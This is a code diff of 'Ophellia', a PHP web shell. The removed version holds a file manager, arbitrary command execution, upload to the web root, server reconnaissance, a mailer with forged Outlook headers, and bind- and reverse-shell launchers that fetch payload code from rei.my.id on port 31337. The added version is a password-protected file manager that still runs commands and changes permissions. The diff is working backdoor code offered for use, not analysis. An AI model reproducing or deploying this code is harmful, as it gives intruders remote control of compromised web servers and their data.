-        error_reporting(E_ERROR);
-
-        $result = @mail($testTo, $testSubject, $testMessage, $testHeaders);
-
-        // Restore original error reporting level
-        error_reporting($errorReporting);
-
-        return $result;
-    }
-
-    private function sendSimpleMail(): void
-    {
-        $to = $this->extractEmail($this->post['to']);
-        $subject = $this->post['subject'];
-        $message = $this->post['message'];
-        $from = $this->extractEmail($this->post['from']);
-        $fromName = $this->extractName($this->post['from']);
-
-        $headers = "From: $fromName <$from>\r\n";
-        $headers .= "Reply-To: $from\r\n";
-        $headers .= "X-Priority: 1\r\n";
-        $headers .= "X-MSmail-Priority: High\r\n";
-        $headers .= "X-Mailer: Microsoft Office Outlook, Build 11.0.5510\r\n";
-        $headers .= "X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441\r\n";
-
-        if (mail($to, $subject, $message, $headers)) {
-            echo "<dialog id='successModal' class='modal success'>
-                    <p>Mail Sent Successfully!</p>
-                    <button onclick='this.closest('dialog').close()'>Close</button>
-                  </dialog>";
-            echo "<script>document.getElementById('successModal').showModal();</script>";
-        } else {
-            echo "<dialog id='errorModal' class='modal error'>
-                    <p>Failed to send mail.</p>
-                    <button onclick='this.closest('dialog').close()'>Close</button>
-                  </dialog>";
-            echo "<script>document.getElementById('errorModal').showModal();</script>";
-        }
-    }
-
-    private function extractEmail(string $input): string
-    {
-        if (strpos($input, '<') !== false && strpos($input, '>') !== false) {
-            preg_match('/<(.+?)>/', $input, $matches);
-            return $matches[1] ?? $input;
-        }
-        return trim($input);
-    }
-
-    private function extractName(string $input): string
-    {
-        preg_match('/(.+?)\s*</', $input, $matches);
-        return trim($matches[1] ?? '');
-    }
-
-    private function handleFileUpload(): void
-    {
-        $uploadPath = $this->post['uploadtype'] == 1 ? $this->currentPath : $_SERVER['DOCUMENT_ROOT'];
-        $tmp = $this->files['upload']['tmp_name'];
-        $up = basename($this->files['upload']['name']);
-        if (move_uploaded_file($tmp, $uploadPath . "/" . $up)) {
-            echo "<dialog id='successModal' class='modal success'>
-            <p>File Uploaded successfully!</p>
-            <button onclick='this.closest('dialog').close()'>Close</button>
-          </dialog>";
-            echo "<script>document.getElementById('successModal').showModal();</script>";
-        } else {
-            echo "<dialog id='errorModal' class='modal error'>
-            <p>Failed to upload file.</p>
-            <button onclick='this.closest('dialog').close()'>Close</button>
-          </dialog>";
-            echo "<script>document.getElementById('errorModal').showModal();</script>";
-        }
-    }
-
-    private function showPathNavigation(): void
-    {
-        echo '<p class="file-manager-utils">';
-        $ps = preg_split("/(\\\|\/)/", $this->currentPath);
-        foreach ($ps as $k => $v) {
-            if ($k == 0 && $v == "") {
-                echo "<a href='?d=2f'>~</a>/";
-                continue;
-            }
-            if ($v == "") {
-                continue;
-            }
-
-            echo "<a href='?d=";
-            for ($i = 0; $i <= $k; $i++) {
-                echo stringToHex($ps[$i]);
-                if ($i != $k) {
-                    echo "2f";
-                }
-
-            }
-            echo "'>{$v}</a>/";
-        }
-        echo '</p>';
-    }
-
-    private function showFileCreator(): void
-    {
-        echo '<p class="file-manager-utils">
-        [ <a href="' . $this->selfFile . '?t=' . stringToHex('mkfile') . '&d=' . stringToHex($this->currentPath) . '"><i class="fas fa-file-alt"></i> New File</a> ]
-        [ <a href="' . $this->selfFile . '?t=' . stringToHex('mkdir') . '&d=' . stringToHex($this->currentPath) . '"><i class="fas fa-folder-plus"></i> New Folder</a> ]
-        [ <a href="' . $this->selfFile . '?t=' . stringToHex('command') . '&d=' . stringToHex($this->currentPath) . '"><i class="fas fa-terminal"></i> Command</a> ]
-        </p>';
-    }
-
-    private function showFileManager(): void
-    {
-        echo '<section class="tool-section">
-        <h2>File Manager</h2>';
-
-        $this->showPathNavigation();
-        $this->showFileCreator();
-
-        echo '<table class="table-container">
-        <thead>
-            <tr>
-                <th>File Name</th>
-                <th>Actions</th>
-                <th>Size</th>
-                <th>Type</th>
-                <th>Permissions</th>
-                <th>Owner/Group</th>
-                <th>Last Modified</th>
-            </tr>
-        </thead>
-        <tbody>';
-
-        $files = scandir($this->currentPath);
-        $folders = [];
-        $regularFiles = [];
-
-        foreach ($files as $file) {
-            if (is_dir($this->currentPath . '/' . $file)) {
-                $folders[] = $file;
-            } else {
-                $regularFiles[] = $file;
-            }
-        }
-
-        // Display folders first
-        foreach ($folders as $folder) {
-            $fullPath = $this->currentPath . '/' . $folder;
-
-            if ($folder == "." || $folder == "..") {
-                $link = $folder == ".." ? stringToHex(dirname($this->currentPath)) : stringToHex($this->currentPath);
-                echo "<tr>
-                <td><img src='//rei.my.id/fldr.png' /> <b><a href='?d={$link}'>$folder</a></b></td>
-                <td colspan='6'></td>
-            </tr>";
-            } else {
-                $actions = "<i class='fa fa-fw fa-download nothing'></i> <i class='fa fa-fw fa-edit nothing'></i> <a href='" . $this->selfFile . "?t=" . stringToHex("cname") . "&oldname=" . stringToHex($folder) . "&d=" . stringToHex($this->currentPath) . "'><i class='fa fa-fw fa-pencil'></i></a> <a href='{$this->selfFile}?rmdir=" . stringToHex($folder) . "&d=" . stringToHex($this->currentPath) . "'><i class='fa fa-fw fa-trash'></i></a>";
-                echo "<tr>
-                <td><img src='//rei.my.id/fldr.png' /> <b><a href='{$this->selfFile}?d=" . stringToHex($fullPath) . "'>$folder</a></b></td>
-                <td>$actions</td>
-                <td>-</td>
-                <td>" . getFileType($fullPath) . "</td>
-                <td>" . getFilePermissions($fullPath) . "</td>
-                <td>" . getOwnerGroup($fullPath) . "</td>
-                <td>" . getLastModified($fullPath) . "</td>
-            </tr>";
-            }
-        }
-
-        // Then display files
-        foreach ($regularFiles as $file) {
-            $fullPath = $this->currentPath . '/' . $file;
-            $actions = "<a href='" . $this->selfFile . '?t=' . stringToHex('download') . '&f=' . stringToHex($file) . '&d=' . stringToHex($this->currentPath) . "'><i class='fa fa-fw fa-download'></i></a> <a href='{$this->selfFile}?t=" . stringToHex('fedit') . "&fedit=" . stringToHex($file) . "&d=" . stringToHex($this->currentPath) . "'><i class='fa fa-fw fa-edit'></i></a> <a href='" . $this->selfFile . "?t=" . stringToHex("cname") . "&oldname=" . stringToHex($file) . "&d=" . stringToHex($this->currentPath) . "'><i class='fa fa-fw fa-pencil'></i></a> <a href='{$this->selfFile}?rfile=" . stringToHex($file) . "&d=" . stringToHex($this->currentPath) . "'><i class='fa fa-fw fa-trash'></i></a>";
-
-            echo "<tr>
-            <td><img src='//rei.my.id/file.png' /> <a href='{$this->selfFile}?t=" . stringToHex('fview') . "&f=" . stringToHex($file) . "&d=" . stringToHex($this->currentPath) . "'>$file</a></td>
-            <td>$actions</td>
-            <td>" . formatFileSize(filesize($fullPath)) . "</td>
-            <td>" . getFileType($fullPath) . "</td>
-            <td>" . getFilePermissions($fullPath) . "</td>
-            <td>" . getOwnerGroup($fullPath) . "</td>
-            <td>" . getLastModified($fullPath) . "</td>
-        </tr>";
-        }
-
-        echo '</tbody></table></section>';
-    }
-
-    private function showFileViewTools(): void
-    {
-        $file = hexToString($this->get['f']);
-        $content = htmlspecialchars(file_get_contents($file));
-
-        echo '<section class="tool-section">
-            <h2>View File: ' . htmlspecialchars($file) . '</h2>
-            <form method="post" action="">
-                <div class="form-group">
-                    <textarea rows="25" readonly>' . $content . '</textarea>
-                </div>
-                <button type="button" onclick="editFile()">Edit</button>
-                <button type="button" onclick="downloadFile()">Download</button>
-                <button type="button" onclick="goBack()">Back</button>
-            </form>
-            <script>
-            function goBack() {
-                window.location.href = "' . $this->selfFile . '?d=' . stringToHex($this->currentPath) . '";
-            }
-            function editFile() {
-                window.location.href = "' . $this->selfFile . '?t=' . stringToHex('fedit') . '&fedit=' . stringToHex($file) . '&d=' . stringToHex($this->currentPath) . '";
-            }
-            function downloadFile() {
-                window.location.href = "' . $this->selfFile . '?t=' . stringToHex('download') . '&f=' . stringToHex($file) . '&d=' . stringToHex($this->currentPath) . '";
-            }
-            </script>
-        </section>';
-    }
-
-    private function showFileEditTools(): void
-    {
-        $file = hexToString($this->get['fedit']);
-        $content = htmlspecialchars(file_get_contents($file));
-
-        echo '<section class="tool-section">
-            <h2>Edit File: ' . htmlspecialchars($file) . '</h2>
-            <form method="post" action="">
-                <div class="form-group">
-                    <textarea name="content" rows="25">' . $content . '</textarea>
-                </div>
-                <button type="submit" name="save_edit">Save Changes</button>
-                <button type="button" onclick="cancelForm()">Cancel</button>
-            </form>
-            <script>
-            function cancelForm() {
-                window.location.href = "' . $this->selfFile . '?d=' . stringToHex($this->currentPath) . '";
-            }
-            </script>
-        </section>';
-
-        if (isset($this->post['save_edit'])) {
-            if (file_put_contents($file, $this->post['content']) !== false) {
-                echo "<dialog id='successModal' class='modal success'>
-                    <p>File Edited Successfully!</p>
-                    <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
-                  </dialog>";
-                echo "<script>document.getElementById('successModal').showModal();</script>";
-            } else {
-                echo "<dialog id='errorModal' class='modal error'>
-                    <p>Failed to edit file.</p>
-                    <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
-                  </dialog>";
-                echo "<script>document.getElementById('errorModal').showModal();</script>";
-            }
-        }
-    }
-
-    private function showRenameFileTools(): void
-    {
-        echo '<section class="tool-section">
-            <h2>Rename File: ' . hexToString($this->get['oldname']) . '</h2>
-            <form method="post" action="">
-            <input type="text" name="oldname" value="' . hexToString($this->get['oldname']) . '" style="display: none;" readonly>
-            <input type="text" name="newname" placeholder="New File Name" required>
-            <button type="submit">Rename File</button>
-            <button type="button" onclick="cancelForm()">Cancel</button>
-        </form>
-        <script>
-        function cancelForm() {
-            window.location.href = "' . $this->selfFile . "?d=" . stringToHex($this->currentPath) . '";
-        }
-        </script></section>';
-        if ($this->post['oldname'] && $this->post['newname']) {
-            if (isset($this->post['oldname'])) {
-                rename($this->post['oldname'], $this->post['newname']);
-                echo "<dialog id='successModal' class='modal success'>
-                <p>File Renamed Successfully!</p>
-                <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
-              </dialog>";
-                echo "<script>document.getElementById('successModal').showModal();</script>";
-
-            } else {
-                echo "<dialog id='errorModal' class='modal error'>
-                <p>Failed to rename file.</p>
-                <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
-              </dialog>";
-                echo "<script>document.getElementById('errorModal').showModal();</script>";
-            }
-        }
-    }
-
-    private function showFileCreationTools(): void
-    {
-        echo "<section class='tool-section'>
-            <h2>Create File</h2>
-            <form method='post' action=''>
-                <div class='form-group'>
-                    <input type='text' id='fname' name='fname' placeholder='File Name' required>
-                </div>
-                <div class='form-group'>
-                    <textarea id='ftext' name='ftext' rows='15' placeholder='File Content'></textarea>
-                </div>
-                <button type='submit' name='createfile'>Create File</button>
-            <button type='button' onclick='cancelForm()'>Cancel</button>
-        </form>
-        <script>
-        function cancelForm() {
-            window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';
-        }
-        </script>
-        </section>";
-
-        if (isset($this->post['createfile'])) {
-            $this->createFile($this->post['fname'], $this->post['ftext'] ?? '');
-        }
-    }
-
-    private function showDirectoryCreationTools(): void
-    {
-        echo "<section class='tool-section'>
-        <h2>Create Directory</h2>
-        <form method='post' action='' id='dirForm'>
-            <div class='form-group'>
-                <input type='text' id='dirname' name='dirname' placeholder='Directory Name' required>
-            </div>
-            <button type='submit' name='createdir'>Create Directory</button>
-            <button type='button' onclick='cancelForm()'>Cancel</button>
-        </form>
-        <script>
-        function cancelForm() {
-            window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';
-        }
-        </script>
-        </section>";
-
-        if (isset($this->post['createdir'])) {
-            $this->createDirectory($this->post['dirname']);
-        }
-    }
-
-    private function showNetworkTools(): void
-    {
-        $pty = file_get_contents('https://rei.my.id/back_connect/python.txt');
-        $rby = file_get_contents('https://rei.my.id/back_connect/ruby.txt');
-        $bcc = file_get_contents('https://rei.my.id/back_connect/c.txt');
-        $bcp = file_get_contents('https://rei.my.id/back_connect/perl.txt');
-        $bpc = file_get_contents('https://rei.my.id/bind_shell/c.txt');
-        $bpp = file_get_contents('https://rei.my.id/bind_shell/perl.txt');
-
-        echo '
-        <section class="tool-section">
-            <h2>Network Tools</h2>
-            <h3>Bind Shell</h3>
-            <form method="post" action="">
-                <p> IP : </p>
-                <input type="text" name="ip" value="' . gethostbyname($_SERVER['HTTP_HOST']) . '" readonly>
-                <p> Port : </p>
-                <input type="text" name="port" value="31337">
-                <p> Type : </p>
-                <select name="type">
-                            <option value="cb">C</option>
-                            <option value="pb">Perl</option>
-                            <option value="rbb">Ruby</option>
-                            <option value="pyb">Python</option>
-                        </select>
-                <button type="submit">Execute</button>
-            </form>
-            <br/>
-            <h3>Reverse Shell</h3>
-            <form method="post" action="">
-                <p> IP : </p>
-                <input type="text" name="ip" value="">
-                <p> Port : </p>
-                <input type="text" name="port" value="31337">
-                <p> Type : </p>
-                <select name="type">
-                    <option value="cbc">C</option>
-                    <option value="pbc">Perl</option>
-                    <option value="rbbc">Ruby</option>
-                    <option value="pybc">Python</option>
-                    </select>
-                <button type="submit">Execute</button>
-            </form>
-        </section>';
-
-        if (isset($this->post['type'])) {
-            $this->executeNetworkTool($this->post['type'], $this->post['ip'], $this->post['port'], $pty, $rby, $bcc, $bcp, $bpc, $bpp);
-        }
-    }
-
-    private function showMailerTools(): void
-    {
-        $mailServerAccessible = $this->checkMailServerAccess();
-
-        echo '<section class="tool-section">
-            <h2>Mailer Tools</h2>';
-
-        if ($mailServerAccessible) {
-            echo '<form method="post" action="" class="mailer-form">
-                <div class="form-group">
-                    <label for="from">From:</label>
-                    <input type="text" id="from" name="from" value="Ophellia < ophellia@' . $_SERVER['SERVER_NAME'] . ' >">
-                </div>
-                <div class="form-group">
-                    <label for="to">To:</label>
-                    <input type="text" id="to" name="to" value="Ophellia < contact@rei.my.id >">
-                </div>
-                <div class="form-group">
-                    <label for="subject">Subject:</label>
-                    <input type="text" id="subject" name="subject" value="Fuck your mom!">
-                </div>
-                <div class="form-group">
-                    <label for="message">Message:</label>
-                    <textarea id="message" name="message" rows="15">my ip address is ' . $_SERVER['REMOTE_ADDR'] . '</textarea>
-                </div>
-                <div class="form-group">
-                    <button type="submit" name="send_mail">Send Mail</button>
-                </div>
-            </form>';
-
-            if (isset($this->post['send_mail'])) {
-                $this->sendSimpleMail();
-            }
-        } else {
-            echo '<p class="error-message">Mail server is not accessible. Mailer tools are currently disabled.</p>';
-        }
-
-        echo '</section>';
-    }
-
-    private function showUploadTools(): void
-    {
-        echo "<section class='tool-section'>
-            <h2>Upload Tools</h2>
-            <form method='post' enctype='multipart/form-data'>
-                <div class='upload-options'>
-                    <div class='upload-option'>
-                        <input type='radio' id='current-dir' name='uploadtype' value='1' checked>
-                        <p>[PATH]</p>
-                        <label for='current-dir'>{$this->currentPath}</label>
-                    </div>
-                    <div class='upload-option'>
-                        <input type='radio' id='doc-root' name='uploadtype' value='2'>
-                        <p>[ROOT]</p>
-                        <label for='doc-root'>{$_SERVER['DOCUMENT_ROOT']}</label>
-                    </div>
-                </div>
-                <div class='file-input-wrapper'>
-                    <input type='file' name='upload' onchange='this.form.querySelector('button[type=submit]').click()'>
-                </div>
-                <button type='submit' name='upload' style='display:none;'>Upload</button>
-            </form>
-        </section>";
-
-        if (isset($this->post['upload'])) {
-            $this->handleFileUpload();
-        }
-    }
-
-    private function showCommandExecutionTools(): void
-    {
-        echo '<section class="tool-section">
-            <h2>Execute Command</h2>
-            <form method="post" action="">
-                <div class="form-group">
-                    <input type="text" id="command" name="execute" placeholder="uname -a" required>
-                </div>
-                <button type="submit">Execute</button>
-                <button type="button" onclick="cancelForm()">Cancel</button>
-        </form>
-        <script>
-        function cancelForm() {
-            window.location.href = "' . $this->selfFile . "?d=" . stringToHex($this->currentPath) . '";
-        }
-        </script>';
-
-        if (isset($this->post['execute']) && !empty($this->post['execute'])) {
-            echo '<pre>' . getFunctionalCmd($this->post['execute']) . '</pre>';
-        }
-
-        echo '</section>';
-    }
-
-    private function showSystemInfo(): void
-    {
-        $disableFunctions = ini_get('disable_functions') ?: 'NONE';
-        $safeMode = ini_get('safe_mode') ? 'ON' : 'OFF';
-        $freeSpace = function_exists('disk_free_space') ? formatFileSize(disk_free_space(".")) : 'N/A';
-
-        $infoItems = [
-            "System" => php_uname('a') . " " . ($_SERVER['SERVER_SOFTWARE'] ?? 'N/A'),
-            "User" => function_exists('get_current_user') ? get_current_user() : 'N/A',
-            "Free Space" => $freeSpace,
-            "Server IP" => gethostbyname($_SERVER['HTTP_HOST'] ?? 'localhost'),
-            "Client IP" => $_SERVER['REMOTE_ADDR'] ?? 'N/A',
-            "Safe Mode" => $safeMode,
-            "PHP Version" => phpversion(),
-            "Disabled Functions" => $disableFunctions,
-        ];
-
-        echo "<section class='tool-section'>";
-        echo "<h2>System Information</h2>";
-        echo "<div class='info-table'>";
-        foreach ($infoItems as $key => $value) {
-            echo "<div class='info-row'>";
-            echo "<div class='info-key'>" . htmlspecialchars($key) . "</div>";
-            echo "<div class='info-value'>" . htmlspecialchars($value) . "</div>";
-            echo "</div>";
-        }
-        echo "</div>";
-        echo "</section>";
-    }
-
-    private function showFooter(): void
-    {
-        echo '</main>
-            <footer>
-                <p><a href="//rei.my.id">@elliottophellia</a><br/>Copyright &copy; 2022 - ' . date('Y') . ' <a href="//github.com/elliottophellia/ophellia">Ophellia</a>.<br/><a href="//github.com/elliottophellia/ophellia">Ophellia</a> are free and open source software distributed under the GNU General Public License.</p>
-            </footer>
-        <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            const hamburger = document.querySelector(".hamburger");
-            const navMenu = document.querySelector(".nav-menu");
-
-            hamburger.addEventListener("click", function() {
-                navMenu.classList.toggle("show");
-            });
-
-            // Close the menu when clicking outside
-            document.addEventListener("click", function(event) {
-                if (!navMenu.contains(event.target) && !hamburger.contains(event.target)) {
-                    navMenu.classList.remove("show");
-                }
-            });
-        });
-        </script>
-        </body>
-        </html>';
-    }
+    
+    echo '<div class="container mx-auto p-4">';
+    echo '<h2 class="text-xl font-bold mb-4">Change Permission: ' . htmlspecialchars(basename($file)) . '</h2>';
+    echo '<form method="post">';
+    echo '<div class="mb-4">';
+    echo '<label class="block text-gray-700">Permission (octal):</label>';
+    echo '<input type="text" name="permission" value="' . substr(sprintf('%o', fileperms($file)), -4) . '" class="w-full p-2 border border-gray-300 rounded">';
+    echo '</div>';
+    echo '<div class="flex space-x-2">';
+    echo '<button type="submit" class="px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600">Change</button>';
+    echo '<a href="?cd=' . encryptPath($dirname) . '" class="px-4 py-2 bg-gray-500 text-white rounded hover:bg-gray-600">Cancel</a>';
+    echo '</div>';
+    echo '</form>';
+    echo '</div>';
 }
 
 session_start();
 error_reporting(0);
-ini_set('display_errors', '0');
-header('X-Powered-By: Ophellia v' . VERSION);
+set_time_limit(0);
+ini_set('memory_limit', '256M');
 
-try {
-    $app = new Elliottophellia($_GET, $_POST, $_FILES);
-    $app->run();
-} catch (Throwable $e) {
-    $errorMessage = 'Caught exception: ' . $e->getMessage() . "\n" . $e->getTraceAsString();
-    echo "<p>An error occurred. Please check the browser console for more details.</p><script>console.error(" . json_encode($errorMessage) . ");</script>";
+// Handle download first
+if (isset($_GET['download'])) {
+    $file = decryptPath($_GET['download']);
+    downloadFile($file);
+    exit;
 }
+
+if (!authenticate()) {
+    echo '<!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Authentication</title>
+        <script src="https://cdn.tailwindcss.com"></script>
+    </head>
+    <body class="bg-gray-100 flex items-center justify-center min-h-screen">
+        <div class="bg-white p-8 rounded shadow-md w-96">
+            <h1 class="text-2xl font-bold mb-6 text-center">Ophellia ' . VERSION . '</h1>
+            <form method="post" action="">
+                <div class="mb-4">
+                    <label for="password" class="block text-gray-700">Password</label>
+                    <input type="password" id="password" name="password" class="w-full p-2 border border-gray-300 rounded">
+                </div>
+                <button type="submit" class="w-full bg-blue-500 text-white py-2 rounded hover:bg-blue-600">Login</button>
+            </form>
+        </div>
+    </body>
+    </html>';
+    exit;
+}
+
+$currentDir = isset($_GET['cd']) ? decryptPath($_GET['cd']) : getcwd();
+if (!file_exists($currentDir) || !is_dir($currentDir)) {
+    $currentDir = getcwd();
+}
+
+$currentUser = getCurrentUser();
+$currentTime = date('Y-m-d H:i:s');
+
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ophellia <?= VERSION ?></title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 min-h-screen">
+    <header class="bg-gray-800 text-white p-4">
+        <div class="container mx-auto">
+            <h1 class="text-xl font-bold">Ophellia <?= VERSION ?></h1>
+            <p class="text-sm">Current Date and Time (UTC - YYYY-MM-DD HH:MM:SS formatted): <?= $currentTime ?></p>
+            <p class="text-sm">Current User's Login: <?= htmlspecialchars($currentUser) ?></p>
+        </div>
+    </header>
+    
+    <div class="container mx-auto p-4">
+        <div class="bg-white p-4 rounded shadow mb-4">
+            <p class="mb-2"><strong>Current Directory:</strong> 
+                <span class="path-navigator">
+                    <?= breadcrumbPath($currentDir) ?>
+                </span>
+            </p>
+            
+            <div class="flex flex-wrap gap-2 mb-4">
+                <a href="?action=newfile&path=<?= encryptPath($currentDir) ?>" class="px-3 py-1 bg-green-500 text-white rounded hover:bg-green-600">New File</a>
+                <a href="?action=newfolder&path=<?= encryptPath($currentDir) ?>" class="px-3 py-1 bg-blue-500 text-white rounded hover:bg-blue-600">New Folder</a>
+                <a href="?action=command&path=<?= encryptPath($currentDir) ?>" class="px-3 py-1 bg-purple-500 text-white rounded hover:bg-purple-600">Command</a>
+            </div>
+        </div>
+        
+        <?php
+        if (isset($_GET['action'])) {
+            switch ($_GET['action']) {
+                case 'view':
+                    if (isset($_GET['file'])) {
+                        viewFile(decryptPath($_GET['file']));
+                    }
+                    break;
+                case 'edit':
+                    if (isset($_GET['file'])) {
+                        editFile(decryptPath($_GET['file']));
+                    }
+                    break;
+                case 'newfile':
+                    if (isset($_GET['path'])) {
+                        newFile(decryptPath($_GET['path']));
+                    }
+                    break;
+                case 'newfolder':
+                    if (isset($_GET['path'])) {
+                        newFolder(decryptPath($_GET['path']));
+                    }
+                    break;
+                case 'command':
+                    if (isset($_GET['path'])) {
+                        commandLine(decryptPath($_GET['path']));
+                    }
+                    break;
+                case 'rename':
+                    if (isset($_GET['file'])) {
+                        renameFile(decryptPath($_GET['file']));
+                    }
+                    break;
+                case 'chmod':
+                    if (isset($_GET['file'])) {
+                        chmodFile(decryptPath($_GET['file']));
+                    }
+                    break;
+                default:
+                    fileManager($currentDir);
+            }
+        } else {
+            fileManager($currentDir);
+        }
+        ?>
+    </div>
+    
+    <footer class="bg-gray-800 text-white p-4 mt-8">
+        <div class="container mx-auto text-center">
+            <p>Ophellia <?= VERSION ?> - Simplified File Manager</p>
+        </div>
+    </footer>
+</body>
+</html>
